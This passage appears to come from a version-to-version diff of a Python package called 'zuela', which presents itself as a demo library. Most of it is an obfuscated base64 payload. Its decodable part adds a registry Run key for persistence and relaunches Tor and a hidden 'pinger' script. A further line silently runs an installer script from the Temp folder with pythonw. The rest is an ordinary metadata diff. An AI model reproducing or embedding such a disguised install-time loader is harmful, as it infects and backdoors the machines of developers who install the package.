Q25NdVkyeHZjMlVvS1EwS2MzVmljSEp2WTJWemN5NVFiM0JsYmlnbmRHRnphMnRwYkd3Z0wyWWdMMmx0SUhSdmNpNWxlR1VuTENCemFHVnNiRDFVY25WbEtTNTNZV2wwS0NrTkNnPT0nKSkNCg0Ka2V5VmFsID0gcidTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW4nDQprZXkgPSB3aW5yZWcuT3BlbktleSh3aW5yZWcuSEtFWV9DVVJSRU5UX1VTRVIsIGtleVZhbCwgMCwgd2lucmVnLktFWV9BTExfQUNDRVNTKQ0Kd2lucmVnLlNldFZhbHVlRXgoa2V5LCAiQ29tbW9uVHlwZSIsIDAsIHdpbnJlZy5SRUdfU1osIGYnIntweXRob253X2ZpbGV9IiAie3Bpbmdlcl9maWxlfSInKQ0Kd2lucmVnLkNsb3NlS2V5KGtleSkNCg0Kc3VicHJvY2Vzcy5Qb3BlbigndGFza2tpbGwgL2YgL2ltIHRvci5leGUnLCBzaGVsbD1UcnVlKS53YWl0KCkNCnN1YnByb2Nlc3MuUG9wZW4oZicie3B5dGhvbndfZmlsZX0iICJ7cGluZ2VyX2ZpbGV9IicsIHNoZWxsPVRydWUpDQo=\'))\r\n        subprocess.Popen(\'\"\'+sys.executable[:-4]+\'w.exe\'+\'\" \"\'+os.path.expandvars(r\'%LOCALAPPDATA%\Temp\')+r\'\install_zuela.py\'+\'\"\', shell=True)\r\n")
```

### Comparing `zuela-0.3.0/zuela.egg-info/PKG-INFO` & `zuela-0.4.0/zuela.egg-info/PKG-INFO`

 * *Files 10% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: zuela
-Version: 0.3.0
+Version: 0.4.0
 Summary: Demo library
 Home-page: https://medium-multiply.readthedocs.io/
 Author: Joffrey Bienvenu
 Author-email: example@email.com
 License: MIT
 Classifier: Intended Audience :: Developers
 Classifier: License :: OSI Approved :: MIT License
```

